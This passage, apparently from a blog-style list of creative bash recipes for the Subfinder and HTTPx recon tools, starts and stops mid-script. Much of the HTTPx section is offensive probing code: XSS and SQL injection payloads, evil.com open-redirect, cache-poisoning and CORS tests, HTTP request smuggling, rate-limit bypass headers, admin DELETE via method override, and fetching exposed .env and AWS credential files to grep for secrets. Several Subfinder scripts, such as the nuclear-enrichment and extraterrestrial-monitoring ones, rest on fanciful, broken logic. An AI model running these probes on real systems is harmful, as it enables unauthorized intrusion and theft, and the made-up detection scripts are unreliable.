        backup_sub="backup-${sub}"
        if host "$backup_sub" &>/dev/null; then
            backup_ready=$(curl -o /dev/null -s -w "%{http_code}" "https://$backup_sub")
            if [ "$backup_ready" == "200" ]; then
                echo "  ✅ Backup system $backup_sub is ready"
            fi
        fi
    fi
done
```

Here are 8 more creative and unconventional ways to use Subfinder:

## 43. **Subdomain-Based Quantum Computing Preparedness Audit**
```bash
# Assess infrastructure readiness for post-quantum cryptography
subfinder -d financial.com -silent | while read sub; do
    echo "🔮 Auditing $sub for quantum resistance..."
    
    # Check current encryption algorithms
    cert_info=$(echo | openssl s_client -connect "$sub:443" 2>/dev/null | openssl x509 -text)
    
    # Identify quantum-vulnerable algorithms
    if echo "$cert_info" | grep -E "RSA|ECDSA|Diffie-Hellman"; then
        key_size=$(echo "$cert_info" | grep "Public-Key:" | grep -Eo '[0-9]+')
        
        # Calculate quantum vulnerability score
        # Based on estimates of quantum computer capability by 2030
        if [ $key_size -lt 2048 ]; then
            q_score=95
            risk="CRITICAL"
        elif [ $key_size -lt 3072 ]; then
            q_score=70
            risk="HIGH"
        elif [ $key_size -lt 4096 ]; then
            q_score=40
            risk="MEDIUM"
        else
            q_score=20
            risk="LOW"
        fi
        
        echo "$sub: Quantum Vulnerability Score: $q_score/100 ($risk)"
        
        # Check for PQC readiness
        if echo "$cert_info" | grep -E "Dilithium|Falcon|SPHINCS|Kyber"; then
            echo "  ✅ Post-quantum algorithms detected"
        else
            echo "  ⚠️ No post-quantum cryptography detected - upgrade by 2030"
            # Generate migration ticket
            cat << EOF >> "pqc_migration_tasks.md"
## $sub Migration Required
- Current: RSA-$key_size
- Risk Level: $risk
- Deadline: 2030-01-01
- Recommended: CRYSTALS-Kyber or NIST PQC standards
EOF
        fi
    fi
done
```

## 44. **Subdomain-Based Extraterrestrial Communication Monitoring**
```bash
# Monitor subdomains for SETI-related activities and space communications
subfinder -d space-agency.com -silent | while read sub; do
    # Check for deep space network endpoints
    if echo "$sub" | grep -E "dsn|deepspace|mars|jupiter|voyager"; then
        echo "🛸 Deep Space Network endpoint: $sub"
        
        # Attempt to detect space communication protocols
        for port in 4343 4344 12345; do
            nc -zv -w 2 "$sub" $port 2>/dev/null && 
            echo "  → Potential DSN port open: $port"
        done
        
        # Check for RF signal data
        curl -s "https://$sub/telemetry" 2>/dev/null | head -100 | while read data; do
            if echo "$data" | grep -E "frequency|modulation|bandwidth|SNR"; then
                echo "  📡 RF Telemetry data accessible: $data"
            fi
        done
    fi
    
    # Monitor for exoplanet research systems
    if curl -s "https://$sub/exoplanet/kepler" 2>/dev/null | grep -q "lightcurve"; then
        echo "⭐ Exoplanet research detected at $sub"
        
        # Extract candidate planet data
        curl -s "https://$sub/api/candidates" | jq '.[] | {name: .planet_name, confidence: .confidence}' 2>/dev/null
    fi
done
```

## 45. **Subdomain-Based Alternative Reality Game (ARG) Detection**
```bash
# Identify potential ARG or viral marketing campaigns
subfinder -d mysterious.com -silent | while read sub; do
    # Check for puzzle/game indicators
    puzzle_score=0
    
    # Look for encoded messages in subdomain names
    if echo "$sub" | grep -E "[0-9]{4}|[a-f0-9]{32}"; then
        puzzle_score=$((puzzle_score + 20))
        echo "🧩 Possible encoded subdomain: $sub"
        
        # Attempt to decode
        echo "$sub" | base64 -d 2>/dev/null && echo "  → Base64 decoded content"
    fi
    
    # Check for steganography in images
    curl -s "https://$sub/image.jpg" -o temp.jpg 2>/dev/null
    if [ -f temp.jpg ]; then
        # Check for hidden data in images
        steghide info temp.jpg 2>/dev/null | grep -q "embedded" && 
        echo "  🔍 Hidden data detected in image at $sub"
        rm temp.jpg
    fi
    
    # Look for ARG narrative elements
    curl -s "https://$sub" | grep -E "riddle|puzzle|mystery|treasure|hunt|clue" && 
    puzzle_score=$((puzzle_score + 30))
    
    if [ $puzzle_score -gt 50 ]; then
        echo "🎮 ARG DETECTED: $sub with confidence score $puzzle_score"
        
        # Create puzzle timeline
        echo "ARG Investigation Log: $sub" >> arg_investigation.log
        echo "First seen: $(date)" >> arg_investigation.log
        echo "Initial clues:" >> arg_investigation.log
        curl -s "https://$sub" | grep -E "riddle|puzzle|clue" | head -5 >> arg_investigation.log
    fi
done
```

## 46. **Subdomain-Based Oceanographic Research Mapping**
```bash
# Discover maritime and oceanographic research infrastructure
subfinder -d ocean-research.org -silent | while read sub; do
    # Check for buoy networks
    if echo "$sub" | grep -E "buoy|float|argo|wave|tide"; then
        echo "🌊 Ocean monitoring station: $sub"
        
        # Try to extract sensor data
        for endpoint in data telemetry readings sensors; do
            data=$(curl -s "https://$sub/api/$endpoint" 2>/dev/null)
            if [ ! -z "$data" ]; then
                echo "  📊 Sensor data accessible at /api/$endpoint"
                
                # Extract oceanographic parameters
                echo "$data" | grep -E "temperature|salinity|pressure|conductivity|depth" | 
                while read param; do
                    echo "    → $param"
                done
            fi
        done
        
        # Get geographic location
        ip=$(dig +short "$sub" | head -1)
        location=$(curl -s "http://ip-api.com/json/$ip" | jq -r '.lat, .lon')
        echo "  📍 Position: $location"
        
        # Check if it's in international waters
        # Add to maritime domain awareness map
        echo "$sub,$location,oceanographic" >> maritime_assets.csv
    fi
    
    # Check for research vessel tracking
    if curl -s "https://$sub/ais/data" 2>/dev/null | grep -q "MMSI"; then
        echo "🚢 Vessel tracking system: $sub"
        curl -s "https://$sub/ais/data" | jq '.[] | {vessel: .name, position: .location}' 2>/dev/null
    fi
done
```

## 47. **Subdomain-Based Dark Pattern Detection**
```bash
# Identify subdomains using dark patterns or deceptive design
subfinder -d ecommerce.com -silent | while read sub; do
    dark_pattern_score=0
    html_content=$(curl -s "https://$sub")
    
    # Check for hidden subscription traps
    if echo "$html_content" | grep -E "hidden.*checkbox|opt.*out.*default|pre.?selected"; then
        dark_pattern_score=$((dark_pattern_score + 25))
        echo "⚠️ Dark pattern detected at $sub: Hidden subscription"
    fi
    
    # Check for misleading button design
    if echo "$html_content" | grep -E "cancel.*small|continue.*large|decline.*greyed"; then
        dark_pattern_score=$((dark_pattern_score + 20))
        echo "⚠️ Dark pattern at $sub: Misleading button design"
    fi
    
    # Check for fake urgency indicators
    if echo "$html_content" | grep -E "only.*left|expiring.*now|last.*chance|limited.*time.*fake"; then
        dark_pattern_score=$((dark_pattern_score + 15))
        echo "⚠️ Dark pattern at $sub: Fake urgency"
    fi
    
    # Check for forced continuity
    continuity_check=$(curl -s -X POST -d "unsubscribe=true" "https://$sub/api/cancel" 2>/dev/null)
    if echo "$continuity_check" | grep -q "requires phone call|can't cancel online"; then
        dark_pattern_score=$((dark_pattern_score + 30))
        echo "🚨 Dark pattern at $sub: Forced continuity (can't cancel online)"
    fi
    
    if [ $dark_pattern_score -gt 50 ]; then
        echo "🔴 CRITICAL: $sub uses extensive dark patterns (Score: $dark_pattern_score)"
        
        # Report to dark pattern database
        curl -X POST -H "Content-Type: application/json" \
            -d "{\"domain\":\"$sub\",\"score\":$dark_pattern_score,\"patterns\":[\"$(echo $dark_pattern_score | md5sum)\"]}" \
            "https://darkpatternsi.org/api/report" 2>/dev/null
    fi
done
```

## 48. **Subdomain-Based Microplastic Pollution Tracking**
```bash
# Correlate industrial subdomains with environmental pollution data
subfinder -d manufacturing.com -silent | while read sub; do
    # Get facility location
    ip=$(dig +short "$sub" | head -1)
    location=$(curl -s "http://ip-api.com/json/$ip")
    lat=$(echo "$location" | jq -r '.lat')
    lon=$(echo "$location" | jq -r '.lon')
    
    # Check against environmental databases
    # Query global plastic pollution data
    pollution_data=$(curl -s "https://api.globalplasticwatch.org/v1/measurements?lat=$lat&lon=$lon&radius=10")
    
    microplastic_level=$(echo "$pollution_data" | jq '.measurements[0].microplastic_ppm // 0')
    global_avg=0.5  # Global average microplastic parts per million
    
    if (( $(echo "$microplastic_level > $global_avg * 2" | bc -l) )); then
        echo "🔬 ENVIRONMENTAL ALERT: $sub location shows high microplastic levels"
        echo "  Location: $lat, $lon"
        echo "  Microplastic concentration: ${microplastic_level}ppm (Global avg: ${global_avg}ppm)"
        
        # Check if facility handles plastics
        if echo "$sub" | grep -E "plastic|polymer|packaging|synthetic"; then
            echo "  → Likely contributor: Industrial plastic processing"
            
            # Generate environmental report
            cat << EOF >> "environmental_impact_report.md"
## $sub Environmental Assessment
- Location: $lat, $lon
- Microplastic Level: ${microplastic_level}ppm
- Status: EXCEEDS GLOBAL AVERAGE
- Recommendations:
  1. Install filtration systems
  2. Review waste management
  3. Quarterly environmental audit
EOF
        fi
    fi
done
```

## 49. **Subdomain-Based Generative AI Training Data Discovery**
```bash
# Find subdomains containing valuable AI training data
subfinder -d research.org -silent | while read sub; do
    ai_training_score=0
    data_types=()
    
    # Check for datasets
    for dataset_path in datasets data training-set corpus labeled-data; do
        if curl -s -I "https://$sub/$dataset_path" 2>/dev/null | grep -q "200"; then
            ai_training_score=$((ai_training_score + 30))
            data_types+=("structured_dataset")
            echo "📊 Dataset found at $sub/$dataset_path"
            
            # Index dataset for AI training
            curl -s "https://$sub/$dataset_path" | head -100 > "dataset_${sub}.sample"
        fi
    done
    
    # Check for ML model endpoints
    for model_path in models inference predict api/v1/classify; do
        if curl -s -X POST -H "Content-Type: application/json" \
            -d '{"input":"test"}' "https://$sub/$model_path" 2>/dev/null | grep -q "prediction\|output"; then
            ai_training_score=$((ai_training_score + 40))
            data_types+=("ml_endpoint")
            echo "🤖 ML model endpoint: $sub/$model_path"
        fi
    done
    
    # Check for research papers
    if curl -s "https://$sub/papers" 2>/dev/null | grep -q "arxiv\|pdf\|research"; then
        ai_training_score=$((ai_training_score + 20))
        data_types+=("research_papers")
        echo "📚 Research papers available at $sub/papers"
    fi
    
    if [ $ai_training_score -gt 50 ]; then
        echo "🎯 VALUABLE AI TRAINING DATA SOURCE: $sub"
        echo "  Data types: ${data_types[*]}"
        echo "  Quality score: $ai_training_score"
        
        # Add to AI training corpus index
        echo "$sub:${data_types[*]}:$ai_training_score" >> ai_training_sources.txt
    fi
done
```

## 50. **Subdomain-Based Nuclear Non-Proliferation Monitoring**
```bash
# Monitor for nuclear-related infrastructure and compliance
subfinder -d energy.gov -silent | while read sub; do
    # Check for nuclear facility indicators
    if echo "$sub" | grep -E "reactor|nuclear|uranium|enrichment|centrifuge|plutonium"; then
        echo "☢️ Nuclear-related subdomain detected: $sub"
        
        # Get facility coordinates
        ip=$(dig +short "$sub" | head -1)
        location=$(curl -s "http://ip-api.com/json/$ip")
        lat=$(echo "$location" | jq -r '.lat')
        lon=$(echo "$location" | jq -r '.lon')
        
        # Check IAEA database for registered facilities
        iaea_check=$(curl -s "https://www.iaea.org/api/facilities?lat=$lat&lon=$lon&radius=5")
        
        if echo "$iaea_check" | grep -q "registered"; then
            echo "  ✅ IAEA-registered facility"
            facility_type=$(echo "$iaea_check" | jq -r '.facilities[0].type')
            echo "  Type: $facility_type"
        else
            echo "  ⚠️ UNREGISTERED nuclear activity at $lat, $lon"
            
            # Generate compliance alert
            cat << EOF >> "nuclear_compliance_alerts.txt
UNREGISTERED NUCLEAR FACILITY DETECTED
Domain: $sub
Location: $lat, $lon
Detection Time: $(date)
Risk Level: HIGH
Action Required: Notify IAEA for inspection
EOF"
            
            # Check for enrichment indicators
            for port in 8080 8443 9443; do
                response=$(curl -s -k "https://$sub:$port/status" 2>/dev/null)
                if echo "$response" | grep -q "centrifuge\|cascade\|enrichment"; then
                    echo "  🔴 ENRICHMENT ACTIVITY DETECTED on port $port"
                fi
            done
        fi
        
        # Monitor for export control violations
        curl -s "https://$sub/shipping" 2>/dev/null | grep -E "dual-use|controlled|export license" &&
        echo "  📦 Potential dual-use exports detected"
    fi
done
```

# 50 Creative Ways to Use HTTPx Beyond Basic Probing

## 1. **Technology Stack Evolution Tracking**
```bash
# Track how technology changes over time
cat subdomains.txt | httpx -silent -tech-detect -json | while read line; do
    domain=$(echo $line | jq -r '.url')
    tech=$(echo $line | jq -r '.["tech-detect"]')
    echo "$(date +%Y-%m-%d),$domain,$tech" >> tech_history.csv
    
    # Compare with historical data
    if grep -q "$domain" tech_history.csv; then
        old_tech=$(grep "$domain" tech_history.csv | tail -2 | head -1 | cut -d',' -f3)
        if [ "$old_tech" != "$tech" ]; then
            echo "🔄 Technology change detected on $domain: $old_tech → $tech"
        fi
    fi
done
```

## 2. **Hidden Development Environments Discovery**
```bash
# Find staging/dev environments by header analysis
cat subdomains.txt | httpx -silent -H "X-Forwarded-For: 127.0.0.1" -H "X-Forwarded-Host: localhost" \
  -header-detect -json | jq -r 'select(.headers | contains("X-Env: development") or contains("X-Staging")) | .url'
```

## 3. **Load Balancer Health Check Exploitation**
```bash
# Identify load balancers and check backend health
cat subdomains.txt | httpx -silent -path "/health" -path "/status" -path "/lbcheck" \
  -status-code -content-length | while read line; do
    if echo "$line" | grep -q "200"; then
        echo "⚠️ Exposed health endpoint: $line"
        # Check if we can see backend servers
        curl -s "$line/health" | grep -E "backend|server-ip|node" && 
        echo "  → Backend information exposed"
    fi
done
```

## 4. **GraphQL Endpoint Discovery**
```bash
# Find GraphQL endpoints with introspection
cat subdomains.txt | httpx -silent -path "/graphql" -path "/gql" -path "/query" -path "/api/graphql" \
  -status-code | while read url; do
    # Test introspection
    introspection='{"query":"{__schema{types{name}}}"}'
    response=$(curl -s -X POST -H "Content-Type: application/json" -d "$introspection" "$url")
    if echo "$response" | grep -q "__schema"; then
        echo "🔓 GraphQL introspection enabled at $url"
        # Extract all types
        echo "$response" | jq '.data.__schema.types[].name' | sort -u
    fi
done
```

## 5. **S3 Bucket Permission Analyzer**
```bash
# Analyze S3 bucket permissions through subdomains
cat subdomains.txt | httpx -silent -s3-detect -json | jq -r 'select(.["s3-detected"]) | .url' | 
while read s3_url; do
    # Check bucket permissions
    for method in GET PUT DELETE; do
        response=$(curl -s -X $method -I "$s3_url")
        if echo "$response" | grep -q "200\|204"; then
            echo "⚠️ S3 bucket allows $method: $s3_url"
        fi
    done
done
```

## 6. **Response Time Profiling for Performance Issues**
```bash
# Profile response times across different regions
cat subdomains.txt | httpx -silent -response-time -json | jq -r '.url + " " + (.response_time|tostring)' | 
while read url time; do
    if (( $(echo "$time > 2.0" | bc -l) )); then
        echo "🐌 Slow response: $url ($time seconds)"
        
        # Geolocate the server
        ip=$(dig +short $(echo $url | cut -d'/' -f3) | head -1)
        curl -s "http://ip-api.com/json/$ip" | jq -r '.country, .city'
        
        # Check CDN usage
        curl -s -I "$url" | grep -i "cf-ray|x-amz-cf-id|x-sucuri-id" && 
        echo "  Using CDN - investigate configuration"
    fi
done
```

## 7. **Open Redirect Chain Discovery**
```bash
# Find open redirects that could be chained
cat subdomains.txt | httpx -silent -path "/?next=http://evil.com" -path "//google.com" \
  -path "/redirect?url=http://evil.com" -status-code -location | while read line; do
    if echo "$line" | grep -q "evil.com\|Location:"; then
        echo "🔄 Open redirect found: $line"
        
        # Test for XSS chaining
        xss_payload="javascript:alert(document.domain)"
        curl -s -L "https://$domain/redirect?url=$xss_payload" | grep -q "alert" &&
        echo "  → XSS chainable redirect"
    fi
done
```

## 8. **API Version Deprecation Detection**
```bash
# Find deprecated API versions still accessible
cat subdomains.txt | httpx -silent -path "/v1" -path "/v2" -path "/api/v1" -path "/api/v2" \
  -path "/v3" -md5 | while read line; do
    url=$(echo $line | cut -d' ' -f1)
    hash=$(echo $line | cut -d' ' -f2)
    
    # Check if older versions return same content
    v1_hash=$(curl -s "$url/v1" 2>/dev/null | md5sum | cut -d' ' -f1)
    v2_hash=$(curl -s "$url/v2" 2>/dev/null | md5sum | cut -d' ' -f1)
    
    if [ "$v1_hash" == "$v2_hash" ]; then
        echo "⚠️ API version confusion: v1 and v2 identical at $url"
    fi
done
```

## 9. **Cache Poisoning Opportunities**
```bash
# Identify cache poisoning vectors
cat subdomains.txt | httpx -silent -H "X-Forwarded-Host: evil.com" -H "X-Forwarded-Scheme: http" \
  -H "X-Original-URL: /admin" -response-headers -json | jq -r 'select(.headers."x-cache" == "HIT") | .url' |
while read url; do
    echo "🎯 Potentially cacheable with header injection: $url"
    
    # Test cache poisoning
    poisoned=$(curl -s -H "X-Forwarded-Host: evil.com" "$url" | grep -c "evil.com")
    if [ $poisoned -gt 0 ]; then
        echo "  ✅ Cache poisoning confirmed"
    fi
done
```

## 10. **WordPress Vulnerability Clustering**
```bash
# Cluster WordPress sites by vulnerability patterns
cat subdomains.txt | httpx -silent -wp-detect -json | jq -r 'select(.["wp-detected"]) | .url' |
while read wp_site; do
    # Check plugin versions
    plugins=$(curl -s "$wp_site/wp-json/wp/v2/plugins" 2>/dev/null | jq -r '.[].version')
    
    for plugin in $plugins; do
        # Query vulnerability database
        vuln=$(curl -s "https://wpscan.com/api/plugins/$plugin" | grep -c "vulnerability")
        if [ $vuln -gt 0 ]; then
            echo "⚠️ Vulnerable plugin $plugin v$plugin on $wp_site"
        fi
    done
    
    # Check user enumeration
    if curl -s "$wp_site/?author=1" | grep -q "author"; then
        echo "  → User enumeration possible"
    fi
done
```

## 11. **Rate Limiting Testing Across Subdomains**
```bash
# Test rate limiting implementations
cat subdomains.txt | httpx -silent -threads 100 -status-code | while read url; do
    # Rapid requests to trigger rate limiting
    for i in {1..50}; do
        code=$(curl -s -o /dev/null -w "%{http_code}" "$url/login")
        if [ "$code" == "429" ] || [ "$code" == "503" ]; then
            echo "🛑 Rate limiting active on $url after $i requests"
            break
        fi
    done
done
```

## 12. **CORS Misconfiguration Scanner**
```bash
# Find CORS misconfigurations
cat subdomains.txt | httpx -silent -cors -json | jq -r 'select(.["cors"] | .allow_origin == "*") | .url' |
while read url; do
    echo "🔓 Wildcard CORS on $url"
    
    # Test credential exposure
    response=$(curl -s -I -H "Origin: https://evil.com" "$url")
    if echo "$response" | grep -q "Access-Control-Allow-Credentials: true"; then
        echo "  ⚠️ Credentials allowed with wildcard origin"
    fi
done
```

## 13. **Subdomain Takeover Signature Database Creation**
```bash
# Create custom takeover signatures
cat subdomains.txt | httpx -silent -status-code -cdn -json | jq -r 'select(.status_code == 404) | .url' |
while read url; do
    cname=$(dig +short CNAME $(echo $url | cut -d'/' -f3))
    
    case $cname in
        *amazonaws*)
            echo "$url -> AWS S3 bucket not found" >> takeover_signatures.txt
            # Check if bucket is available
            bucket_name=$(echo $cname | cut -d'.' -f1)
            if aws s3 ls "s3://$bucket_name" 2>&1 | grep -q "NoSuchBucket"; then
                echo "  ✅ Available for takeover"
            fi
            ;;
        *azure*)
            echo "$url -> Azure storage not found" >> takeover_signatures.txt
            ;;
        *github*)
            echo "$url -> GitHub pages not found" >> takeover_signatures.txt
            ;;
    esac
done
```

## 14. **Security Headers Compliance Dashboard**
```bash
# Generate security headers compliance report
cat subdomains.txt | httpx -silent -header-detect -json | jq -r '.url as $url | 
  {url: $url, 
   hsts: .headers."strict-transport-security" // "missing",
   csp: .headers."content-security-policy" // "missing",
   xfo: .headers."x-frame-options" // "missing",
   xss: .headers."x-xss-protection" // "missing"
  }' | while read line; do
    url=$(echo $line | jq -r '.url')
    score=0
    
    # Calculate security score
    if [ "$(echo $line | jq -r '.hsts')" != "missing" ]; then score=$((score + 25)); fi
    if [ "$(echo $line | jq -r '.csp')" != "missing" ]; then score=$((score + 25)); fi
    if [ "$(echo $line | jq -r '.xfo')" != "missing" ]; then score=$((score + 25)); fi
    if [ "$(echo $line | jq -r '.xss')" != "missing" ]; then score=$((score + 25)); fi
    
    echo "$url: Security Headers Score: $score/100"
    
    if [ $score -lt 50 ]; then
        echo "  ⚠️ Critical: Missing multiple security headers"
        # Generate fix commands
        echo "  Fix: Add HSTS, CSP, X-Frame-Options headers"
    fi
done > security_headers_report.csv
```

## 15. **Web Cache Deception Scanner**
```bash
# Find web cache deception vulnerabilities
cat subdomains.txt | httpx -silent -path "/profile.php/nonexistent.css" \
  -path "/admin/nonexistent.jpg" -path "/user/123/avatar.css" -status-code -content-type |
while read line; do
    url=$(echo $line | cut -d' ' -f1)
    type=$(echo $line | cut -d' ' -f3)
    
    if echo "$type" | grep -q "text/html\|application/json"; then
        echo "🎭 Web cache deception possible at $url"
        
        # Check if cached
        first_response=$(curl -s -I "$url" | grep -i "x-cache:")
        sleep 5
        second_response=$(curl -s -I "$url" | grep -i "x-cache:")
        
        if [ "$first_response" == "$second_response" ] && [ ! -z "$first_response" ]; then
            echo "  ✅ Cached response confirmed - vulnerable to deception"
        fi
    fi
done
```

## 16. **API Rate Limit Bypass Detection**
```bash
# Test for rate limit bypass techniques
cat subdomains.txt | httpx -silent -path "/api" -path "/v1/api" -path "/rest" | while read api_url; do
    # Test different bypass methods
    for header in "X-Forwarded-For: 127.0.0.1" "X-Real-IP: 127.0.0.1" "X-Originating-IP: 127.0.0.1"; do
        for i in {1..100}; do
            response=$(curl -s -o /dev/null -w "%{http_code}" -H "$header" "$api_url")
            if [ "$response" == "200" ]; then
                echo "🔓 Rate limit bypass at $api_url using $header"
                break 2
            fi
        done
    done
done
```

## 17. **Sensitive File Exposure Finder**
```bash
# Search for exposed sensitive files
cat subdomains.txt | httpx -silent \
  -path "/.env" \
  -path "/.git/config" \
  -path "/.aws/credentials" \
  -path "/wp-config.php.bak" \
  -path "/config/database.yml" \
  -path "/backup.sql" \
  -path "/.svn/entries" \
  -path "/server-status" \
  -path "/phpinfo.php" \
  -path "/.DS_Store" \
  -status-code -content-length | while read line; do
    url=$(echo $line | cut -d' ' -f1)
    code=$(echo $line | cut -d' ' -f2)
    
    if [ "$code" == "200" ]; then
        echo "🔴 EXPOSED: $url"
        
        # Extract sensitive data
        case $url in
            *.env)
                curl -s "$url" | grep -E "DB_|PASS|KEY|SECRET" && 
                echo "  → Database credentials exposed"
                ;;
            *.git/config)
                echo "  → Git repository exposed"
                ;;
            *.sql)
                size=$(curl -s "$url" | wc -c)
                echo "  → SQL dump exposed: ${size} bytes"
                ;;
        esac
    fi
done
```

## 18. **CDN Origin IP Discovery**
```bash
# Find origin servers behind CDNs
cat subdomains.txt | httpx -silent -cdn -json | jq -r 'select(.["cdn-name"]) | .url' |
while read url; do
    domain=$(echo $url | cut -d'/' -f3)
    
    # Try historical DNS
    curl -s "https://securitytrails.com/domain/$domain/dns" | grep -E "[0-9]{1,3}\.[0-9]{1,3}" | 
    while read ip; do
        if ! echo "$ip" | grep -q "$(dig +short $domain)"; then
            echo "🎯 Possible origin IP for $domain: $ip"
            
            # Test direct connection
            curl -s -H "Host: $domain" "http://$ip" -I | grep -q "200" &&
            echo "  ✅ Origin accessible directly at $ip"
        fi
    done
    
    # Try subdomain IP history
    curl -s "https://viewdns.info/iphistory/?domain=$domain" | grep -E "[0-9]{1,3}\.[0-9]{1,3}" | 
    sort -u | head -5
done
```

## 19. **Form Input Validation Testing**
```bash
# Test form input validation across subdomains
cat subdomains.txt | httpx -silent -forms -json | jq -r 'select(.forms) | .url' |
while read url; do
    # Extract form actions
    curl -s "$url" | grep -E '<form.*action="([^"]+)"' -o | while read form; do
        action=$(echo $form | sed 's/.*action="//; s/".*//')
        
        # Test XSS
        xss_payload="<script>alert(1)</script>"
        response=$(curl -s -X POST -d "input=$xss_payload" "$url/$action")
        if echo "$response" | grep -q "$xss_payload"; then
            echo "❌ XSS vulnerability at $url$action"
        fi
        
        # Test SQL injection
        sql_payload="' OR '1'='1"
        response=$(curl -s -X POST -d "username=$sql_payload&password=test" "$url/$action")
        if echo "$response" | grep -q "Welcome\|Dashboard\|Admin"; then
            echo "💉 SQL injection at $url$action"
        fi
    done
done
```

## 20. **HTTP/2 vs HTTP/3 Performance Comparison**
```bash
# Compare protocol performance
cat subdomains.txt | httpx -silent -http2 -http3 -json | jq -r '.url' | while read url; do
    # Test HTTP/2
    time_h2=$(curl -s -o /dev/null -w "%{time_total}\n" --http2-prior-knowledge "$url" 2>/dev/null)
    
    # Test HTTP/3
    time_h3=$(curl -s -o /dev/null -w "%{time_total}\n" --http3 "$url" 2>/dev/null)
    
    if [ ! -z "$time_h2" ] && [ ! -z "$time_h3" ]; then
        improvement=$(echo "($time_h2 - $time_h3) * 100 / $time_h2" | bc -l)
        echo "$url: HTTP/3 is ${improvement}% faster than HTTP/2"
    fi
done
```

## 21. **JavaScript Library Version Vulnerability Check**
```bash
# Check JavaScript library versions against vulnerability DB
cat subdomains.txt | httpx -silent | while read url; do
    curl -s "$url" | grep -E 'src="[^"]*\.js"' -o | while read js; do
        js_url=$(echo $js | sed 's/src="//; s/"//')
        full_url="https://$(echo $url | cut -d'/' -f3)$js_url"
        
        # Download and check version
        curl -s "$full_url" | grep -E '@version|version:|jQuery v|bootstrap v' | 
        while read version_line; do
            if echo "$version_line" | grep -q "jQuery"; then
                ver=$(echo "$version_line" | grep -Eo '[0-9]+\.[0-9]+\.[0-9]+')
                # Check against known vulnerable versions
                if [[ "$ver" =~ ^1\.[0-9]|^2\.[0-9] ]]; then
                    echo "⚠️ Vulnerable jQuery $ver at $full_url"
                fi
            fi
        done
    done
done
```

## 22. **HTTP Request Smuggling Detection**
```bash
# Detect HTTP request smuggling vulnerabilities
cat subdomains.txt | httpx -silent -ports 80,443,8080,8443 | while read url; do
    # Test CL.TE variant
    response=$(curl -s -i -k -H "Transfer-Encoding: chunked" -d "5\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n0\r\n\r\n" "$url")
    
    if echo "$response" | grep -q "HTTP/1.1 200"; then
        echo "🚨 HTTP Request Smuggling (CL.TE) at $url"
    fi
    
    # Test TE.CL variant
    response=$(curl -s -i -k -H "Transfer-Encoding: chunked" -d "5e\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\nContent-Length: 10\r\n\r\n0\r\n\r\n" "$url")
    
    if echo "$response" | grep -q "HTTP/1.1 200"; then
        echo "🚨 HTTP Request Smuggling (TE.CL) at $url"
    fi
done
```

## 23. **Subdomain Content Drift Monitoring**
```bash
# Monitor for content changes indicating compromise
cat subdomains.txt | httpx -silent -md5 -json | jq -r '.url + " " + .md5' > baseline.txt

while true; do
    cat subdomains.txt | httpx -silent -md5 -json | jq -r '.url + " " + .md5' > current.txt
    
    diff baseline.txt current.txt | grep "^>" | while read line; do
        changed_url=$(echo $line | cut -d' ' -f2)
        old_hash=$(grep "$changed_url" baseline.txt | cut -d' ' -f2)
        new_hash=$(echo $line | cut -d' ' -f3)
        
        echo "🔴 Content changed: $changed_url"
        echo "  Old hash: $old_hash"
        echo "  New hash: $new_hash"
        
        # Check for malicious content
        curl -s "$changed_url" | grep -E "hacked|defaced|pwned|owned" && 
        echo "  ⚠️ Possible defacement detected"
    done
    
    mv current.txt baseline.txt
    sleep 3600  # Check hourly
done
```

## 24. **Virtual Host Discovery**
```bash
# Discover virtual hosts on same IP
cat subdomains.txt | httpx -silent -websocket -json | jq -r '.url' | 
while read url; do
    ip=$(dig +short $(echo $url | cut -d'/' -f3) | head -1)
    
    # Try common vhosts
    for vhost in admin dev staging test api internal; do
        response=$(curl -s -o /dev/null -w "%{http_code}" -H "Host: $vhost.$(echo $url | cut -d'/' -f3)" "http://$ip")
        if [ "$response" == "200" ]; then
            echo "🎯 Vhost discovered: $vhost.$(echo $url | cut -d'/' -f3) on $ip"
        fi
    done
    
    # Check for default vhost
    default_response=$(curl -s -I -H "Host: anything" "http://$ip" | head -1)
    if echo "$default_response" | grep -q "200"; then
        echo "  Default vhost accepts any Host header"
    fi
done
```

## 25. **TLS Cipher Suite Strength Analysis**
```bash
# Analyze TLS cipher strength across subdomains
cat subdomains.txt | httpx -silent -tls-grab -json | jq -r '.url + " " + (.["tls-grab"] | tostring)' |
while read url tls_data; do
    weak_ciphers=0
    
    # Check for weak ciphers
    if echo "$tls_data" | grep -q "RC4\|DES\|MD5\|EXPORT\|NULL"; then
        weak_ciphers=$((weak_ciphers + 1))
        echo "⚠️ Weak cipher detected on $url"
    fi
    
    # Check TLS version
    if echo "$tls_data" | grep -q "TLSv1.0\|TLSv1.1\|SSLv3"; then
        echo "❌ Outdated TLS version on $url"
        weak_ciphers=$((weak_ciphers + 2))
    fi
    
    # Score the configuration
    if [ $weak_ciphers -eq 0 ]; then
        echo "✅ Strong TLS configuration on $url"
    else
        echo "  Security score: $((100 - weak_ciphers * 20))/100"
    fi
done
```

## 26. **HTTP Parameter Pollution Testing**
```bash
# Test for HTTP parameter pollution vulnerabilities
cat subdomains.txt | httpx -silent -path "/search?q=test&q=malicious" \
  -path "/api?user=123&user=admin" -path "/page?debug=false&debug=true" |
while read url; do
    # Check which parameter takes precedence
    response=$(curl -s "$url")
    
    if echo "$response" | grep -q "malicious\|admin\|true"; then
        echo "🎯 Parameter pollution possible at $url"
        
        # Test for server-side pollution
        pollution_test=$(curl -s -X POST -d "user=123&user=admin" "$url")
        if echo "$pollution_test" | grep -q "Welcome admin"; then
            echo "  ✅ Confirmed - can escalate privileges"
        fi
    fi
done
```

## 27. **HTTP Method Override Detection**
```bash
# Find HTTP method override vulnerabilities
cat subdomains.txt | httpx -silent | while read url; do
    # Test various method override headers
    for header in "X-HTTP-Method-Override: DELETE" "X-HTTP-Method: DELETE" "X-Method-Override: DELETE"; do
        response=$(curl -s -X POST -H "$header" -I "$url/admin")
        
        if echo "$response" | grep -q "200\|202\|204"; then
            echo "🔓 Method override allowed on $url using $header"
            
            # Test if we can delete
            delete_test=$(curl -s -X POST -H "$header" -w "%{http_code}" "$url/admin/user/1")
            if [ "$delete_test" == "200" ]; then
                echo "  ⚠️ Can perform DELETE operations via POST"
            fi
        fi
    done
done
```

## 28. **Cookie Security Analysis**
```bash
# Analyze cookie security configurations
cat subdomains.txt | httpx -silent -cookie-detect -json | jq -r '.url as $url | 
  {url: $url, cookies: .headers["set-cookie"]}' | while read line; do
    url=$(echo $line | jq -r '.url')
    cookies=$(echo $line | jq -r '.cookies')
    
    if [ "$cookies" != "null" ]; then
        # Check Secure flag
        if ! echo "$cookies" | grep -q "Secure"; then
